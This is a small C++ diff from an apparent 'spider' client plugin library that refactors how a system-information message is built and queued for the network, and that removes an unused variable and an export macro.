@@ -80,10 +80,10 @@ namespace spider
       {
 	SystemMsg msg;
 
-	msg.type = SystemMsgType::Infos;
-	msg.currentWindow.fill(0);
-	msg.data.size = sizeof(m_infos);
-	msg.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
+	msg.sys.type = SystemMsgType::Infos;
+	msg.sys.currentWindow.fill(0);
+	msg.sys.data.size = sizeof(m_infos);
+	msg.sys.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
 	m_networkResponseQueue.push("OK\r\n");
 	m_sendToNetwork->push(msg);
       }
@@ -225,7 +225,7 @@ namespace spider
 	{
 	  CPUID cpuID(1);
 
-	  std::uint16_t cpuFeatures = cpuID.EDX();            // EDX
+	  // CPU feature are in EDX
 	  std::uint16_t logical = (cpuID.EBX() >> 16) & 0xff; // EBX[23:16]
 	  nbCPUs = logical;
 	}
@@ -264,12 +264,6 @@ namespace spider
     }
   }
 }
-
-#if defined __linux__ || defined __APPLE__
-#define SPIDER_API
-#else
-#define SPIDER_API __declspec(dllexport)
-#endif
 
 static spider::client::library::SpiderPlugin payload;
 
